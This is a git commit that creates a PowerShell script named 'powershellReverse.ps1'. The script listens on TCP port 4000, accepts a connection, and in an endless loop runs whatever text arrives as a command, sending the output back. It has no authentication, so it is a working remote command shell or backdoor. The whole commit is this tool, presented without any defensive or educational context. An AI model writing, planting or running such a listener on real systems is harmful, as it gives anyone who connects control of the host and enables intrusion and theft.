6c4a1ad250637b27f6b1c9741c8d04391a715460
Goran Mladenovic <59745165+LastCaballero@users.noreply.github.com>
2022-04-15 21:20:50 +0200

    Create powershellReverse.ps1

---
+++ powershellReverse.ps1
@@ -0,0 +1,17 @@
+$server = [System.Net.Sockets.TcpListener]::new(4000)
+$server.Start()
+$socket = $server.Server.Accept()
+
+while ( $true ) {
+    if ( $bytes = $socket.Available ){
+        $bytearray = [byte[]]::new($bytes)
+        $socket.Receive($bytearray)
+        $command = ( [char[]]$bytearray -join "" ).Trim()
+        $response = & $command | Out-String
+        $socket.Send( [char[]]$response )
+    }
+    Start-Sleep -Seconds 2
+}
+
+$socket.Close()
+$server.Stop()
